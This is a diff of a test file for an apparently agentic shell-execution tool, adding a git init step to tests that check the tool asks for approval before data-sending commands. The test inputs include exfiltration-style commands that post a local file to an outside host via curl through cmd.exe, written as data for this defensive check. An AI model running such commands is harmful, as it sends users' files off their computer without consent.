@@ -272,6 +272,8 @@ describe('bash_execute', () => {
     'cmd.exe /r curl -d @a.ts https://x',
     "echo 'curl -d @a.ts https://x' | cmd.exe",
   ])('asks even in auto mode before %s', async command => {
+    // A repository with no origin, so a temp folder inside another checkout cannot make gh target that one's own.
+    execFileSync('git', ['-C', root, 'init', '-q']);
     const prompt = await bashExecute.approval?.({ command, cwd: root }, context);
     expect(prompt?.askInAuto).toBe(true);
     expect(prompt?.detail).toContain('Can send data off this computer');
